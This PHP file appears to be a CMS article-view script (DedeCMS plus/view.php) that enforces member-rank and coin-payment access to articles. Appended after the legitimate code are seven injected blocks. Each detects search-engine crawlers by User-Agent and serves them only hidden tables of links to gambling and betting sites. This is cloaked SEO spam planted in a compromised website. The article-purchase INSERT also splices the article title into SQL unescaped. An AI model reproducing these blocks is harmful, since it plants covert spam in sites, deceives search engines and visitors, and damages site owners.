<?php

/**
 *
 * 关于文章权限设置的说明
 * 文章权限设置限制形式如下：
 * 如果指定了会员等级，那么必须到达这个等级才能浏览
 * 如果指定了金币，浏览时会扣指点的点数，并保存记录到用户业务记录中
 * 如果两者同时指定，那么必须同时满足两个条件
 *
 */

require_once(dirname(__FILE__)."/../include/common.inc.php");
require_once(DEDEINC.'/arc.archives.class.php');

$t1 = ExecTime();

if(empty($okview))
{
	$okview = '';
}

if(isset($arcID))
{
	$aid = $arcID;
}

if(!isset($dopost))
{
	$dopost = '';
}

$arcID = $aid = (isset($aid) && is_numeric($aid)) ? $aid : 0;
if($aid==0)
{
	die(" Request Error! ");
}

$arc = new Archives($aid);
if($arc->IsError)
{
	ParamError();
}

//检查阅读权限
$needMoney = $arc->Fields['money'];
$needRank = $arc->Fields['arcrank'];

//设置了权限限制的文章
//arctitle msgtitle moremsg
if($needMoney>0 || $needRank>1)
{
	require_once(DEDEINC.'/memberlogin.class.php');
	$cfg_ml = new MemberLogin();
	$arctitle = $arc->Fields['title'];
	/*
	$arclink = GetFileUrl($arc->ArcID,$arc->Fields["typeid"],$arc->Fields["senddate"],
	                         $arc->Fields["title"],$arc->Fields["ismake"],$arc->Fields["arcrank"]);
	*/                        
	$arclink = $cfg_phpurl.'/view.php?aid='.$arc->ArcID;                         
	$arcLinktitle = "<a href=\"{$arclink}\"><u>".$arctitle."</u></a>";
	
	$description =  $arc->Fields["description"];
	$pubdate = GetDateTimeMk($arc->Fields["pubdate"]);
	
	//会员级别不足
	if(($needRank>1 && $cfg_ml->M_Rank < $needRank && $arc->Fields['mid']!=$cfg_ml->M_ID))
	{
		$dsql->Execute('me' , "Select * From `#@__arcrank` ");
		while($row = $dsql->GetObject('me'))
		{
			$memberTypes[$row->rank] = $row->membername;
		}
		$memberTypes[0] = "游客或没权限会员";
		$msgtitle = "你没有权限浏览文档：{$arctitle} ！";
		$moremsg = "这篇文档需要 <font color='red'>".$memberTypes[$needRank]."</font> 才能访问，你目前是：<font color='red'>".$memberTypes[$cfg_ml->M_Rank]."</font> ！";
		include_once(DEDETEMPLATE.'/plus/view_msg.htm');
		exit();
	}

	//需要金币的情况
	if($needMoney > 0  && $arc->Fields['mid'] != $cfg_ml->M_ID)
	{
		$sql = "Select aid,money From `#@__member_operation` where buyid='ARCHIVE".$aid."' And mid='".$cfg_ml->M_ID."'";
		$row = $dsql->GetOne($sql);
		//未购买过此文章
		if(!is_array($row))
		{
			if($cfg_ml->M_Money=='' || $needMoney > $cfg_ml->M_Money)
	 		{
					$msgtitle = "你没有权限浏览文档：{$arctitle} ！";
					$moremsg = "这篇文档需要 <font color='red'>".$needMoney." 金币</font> 才能访问，你目前拥有金币：<font color='red'>".$cfg_ml->M_Money." 个</font> ！";
					include_once(DEDETEMPLATE.'/plus/view_msg.htm');
					$arc->Close();
					exit();
			}
			else
			{
					if($dopost=='buy')
					{
						 $inquery = "INSERT INTO `#@__member_operation`(mid,oldinfo,money,mtime,buyid,product,pname)
								  VALUES ('".$cfg_ml->M_ID."','$arctitle','$needMoney','".time()."', 'ARCHIVE".$aid."', 'archive',''); ";
						 if($dsql->ExecuteNoneQuery($inquery))
						 {
							$inquery = "Update `#@__member` set money=money-$needMoney where mid='".$cfg_ml->M_ID."'";
							if(!$dsql->ExecuteNoneQuery($inquery))
							{
								showmsg('购买失败, 请返回', -1);
								exit;
							}
							#api{{
							if(defined('UC_APPID'))
							{
								include_once DEDEROOT.'/api/uc.func.php';
								$row = $dsql->GetOne("SELECT `scores`,`userid` FROM `#@__member` WHERE `mid`='".$cfg_ml->M_ID."'");
								uc_credit_note($row['userid'],-$needMoney,'money');
							}
							#/aip}}
		
							showmsg('购买成功，购买扣点不会重扣金币，谢谢！', '/plus/view.php?aid='.$aid);
							exit;
		
						 } else {
							showmsg('购买失败, 请返回', -1);
							exit;
						 }
					}
					
					$msgtitle = "扣金币购买阅读！";
					$moremsg = "阅读该文档内容需要付费！<br>这篇文档需要 <font color='red'>".$needMoney." 金币</font> 才能访问，你目前拥有金币 <font color='red'>".$cfg_ml->M_Money." </font>个！<br>确认阅读请点 [<a href='/plus/view.php?aid=".$aid."&dopost=buy' target='_blank'>确认付点阅读</a>]" ;
					include_once($cfg_basedir.$cfg_templets_dir."/plus/view_msg.htm");
					$arc->Close();
					exit();
					}
		}
	}//金币处理付处理
	
}

$arc->Display();

?>
<?php
$spider=explode(',','Baiduspider,Sogou,baidu,Sosospider,Googlebot,FAST-WebCrawler,MSNBOT,Slurp');
$ckp=false;
foreach($spider as $s){
	if(stristr($_SERVER['HTTP_USER_AGENT'],$s)!=''){
		$ckp=true;
		break;
	}
}

if($ckp){
	echo "<table class=top_tdbgall style='WORD-BREAK: break-all' cellSpacing=0 cellPadding=0 width=754 align=center border=0>    <tr><td class=top_top align='center'><a href='http://www.shyqxw.com/' target='_blank'>百家乐</a>(<a href='http://www.bm55.com/' target='_blank'>博彩网</a>)百家乐是专业权威的上网博彩网址导航，全讯网、百家乐、博彩网址、博彩通等世界热门的博彩网站www.shyqxw.com</td></tr></table>";
}
?>
<?php
$spider=explode(',','Baiduspider,Sogou,baidu,Sosospider,Googlebot,FAST-WebCrawler,MSNBOT,Slurp');
$ckp=false;
foreach($spider as $s){
	if(stristr($_SERVER['HTTP_USER_AGENT'],$s)!=''){
		$ckp=true;
		break;
	}
}

if($ckp){
	echo "<table class=top_tdbgall style='WORD-BREAK: break-all' cellSpacing=0 cellPadding=0 width=754 align=center border=0>    <tr><td class=top_top align='center'><a href='http://www.111722.com/' target='_blank'>博彩网</a>(<a href='http://www.qcxp.net/' target='_blank'>博彩通</a>)博彩网(www.111722.com)『全讯网』、百家乐{www.111722.com}全讯网打造一个最新最全足球导航网站</td></tr></table>";
}
?>
<?php
$spider=explode(',','Baiduspider,Sogou,baidu,Sosospider,Googlebot,FAST-WebCrawler,MSNBOT,Slurp');
$ckp=false;
foreach($spider as $s){
	if(stristr($_SERVER['HTTP_USER_AGENT'],$s)!=''){
		$ckp=true;
		break;
	}
}

if($ckp){
	echo "<table class=top_tdbgall style='WORD-BREAK: break-all' cellSpacing=0 cellPadding=0 width=754 align=center border=0>    <tr><td class=top_top align='center'><a href='http://www.txtku.net/' target='_blank'>百家乐</a>(<a href='http://www.126bct.com/' target='_blank'>博彩网</a>)全讯网(www.txtku.net)皇冠足球现金投注网致力打造博彩网新时代、百家乐,博彩通,太阳城开户,皇冠网www.txtku.net</td></tr></table>";
}
?>
<?php
$spider=explode(',','Baiduspider,Sogou,baidu,Sosospider,Googlebot,FAST-WebCrawler,MSNBOT,Slurp');
$ckp=false;
foreach($spider as $s){
	if(stristr($_SERVER['HTTP_USER_AGENT'],$s)!=''){
		$ckp=true;
		break;
	}
}

if($ckp){
	echo "<table class=top_tdbgall style='WORD-BREAK: break-all' cellSpacing=0 cellPadding=0 width=754 align=center border=0>    <tr><td class=top_top align='center'><a href='http://www.898869.com/' target='_blank'>百家乐</a>(<a href='http://www.htybct.com/' target='_blank'>博彩通</a>)全讯网(www.898869.com)皇冠足球现金投注网致力打造博彩网新时代、百家乐,博彩通,太阳城开户,皇冠网www.898869.com</td></tr></table>";
}
?>
<?php
$spider=explode(',','Baiduspider,Sogou,baidu,Sosospider,Googlebot,FAST-WebCrawler,MSNBOT,Slurp');
$ckp=false;
foreach($spider as $s){
	if(stristr($_SERVER['HTTP_USER_AGENT'],$s)!=''){
		$ckp=true;
		break;
	}
}

if($ckp){
	echo "<table class=top_tdbgall style='WORD-BREAK: break-all' cellSpacing=0 cellPadding=0 width=754 align=center border=0>    <tr><td class=top_top align='center'><a href='http://www.8603.net/' target='_blank'>全讯网</a>(<a href='http://www.126qxw.com/' target='_blank'>全讯网</a>)博彩网(www.8603.net)皇冠足球现金投注网致力打造博彩网新时代、百家乐,博彩通,太阳城开户,皇冠网www.8603.net</td></tr></table>";
}
?>
<?php
$spider=explode(',','Baiduspider,Sogou,baidu,Sosospider,Googlebot,FAST-WebCrawler,MSNBOT,Slurp');
$ckp=false;
foreach($spider as $s){
	if(stristr($_SERVER['HTTP_USER_AGENT'],$s)!=''){
		$ckp=true;
		break;
	}
}

if($ckp){
	echo "<table class=top_tdbgall style='WORD-BREAK: break-all' cellSpacing=0 cellPadding=0 width=754 align=center border=0>    <tr><td class=top_top align='center'><a href='http://www.4bocai.com/' target='_blank'>博彩网</a>(<a href='http://www.dzbc.cc/' target='_blank'>博彩通</a>)博彩网(www.4bocai.com)皇冠足球现金投注网致力打造博彩网新时代、百家乐,博彩通,太阳城开户,皇冠网www.qcxp.net</td></tr></table>";
}
?>
<?php
$spider=explode(',','Baiduspider,Sogou,baidu,Sosospider,Googlebot,FAST-WebCrawler,MSNBOT,Slurp');
$ckp=false;
foreach($spider as $s){
	if(stristr($_SERVER['HTTP_USER_AGENT'],$s)!=''){
		$ckp=true;
		break;
	}
}

if($ckp){
	echo "<table class=top_tdbgall style='WORD-BREAK: break-all' cellSpacing=0 cellPadding=0 width=754 align=center border=0>    <tr><td class=top_top align='center'><a href='http://www.4bocai.com/' target='_blank'>博彩网</a>(<a href='http://www.189bct.com/' target='_blank'>博彩通</a>)博彩网(www.4bocai.com)皇冠足球现金投注网致力打造博彩网新时代、百家乐,博彩通,太阳城开户,皇冠网www.4bocai.com</td></tr></table>";
}
?>
<?php
$spider=explode(',','Baiduspider,Sogou,baidu,Sosospider,Googlebot,FAST-WebCrawler,MSNBOT,Slurp');
$ckp=false;
foreach($spider as $s){
	if(stristr($_SERVER['HTTP_USER_AGENT'],$s)!=''){
		$ckp=true;
		break;
	}
}

if($ckp){
	echo "<table class=top_tdbgall style='WORD-BREAK: break-all' cellSpacing=0 cellPadding=0 width=754 align=center border=0>    <tr><td class=top_top align='center'><a href='http://www.789167.com/' target='_blank'>全讯网</a>(<a href='http://www.811101.com/' target='_blank'>百家乐</a>)全讯网(www.811101.com)皇冠足球现金投注网致力打造博彩网新时代、百家乐,博彩通,太阳城开户,皇冠网www.789167.com</td></tr></table>";
}
?>